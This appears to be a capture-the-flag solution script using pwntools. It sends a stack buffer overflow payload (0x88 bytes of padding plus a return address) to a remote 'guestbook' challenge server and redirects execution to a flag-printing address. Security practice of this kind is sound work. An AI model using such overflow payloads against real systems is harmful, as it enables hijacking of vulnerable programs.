from pwn import *

elf = ELF(r'../guestbook')
r = remote('node5.buuoj.cn', 27086)

context.log_level = 'debug'

flag_addr = 0x400620

payload = b'A' * 0x88 + p64(flag_addr)
r.sendlineafter('Input your message:\n', payload)
r.interactive()


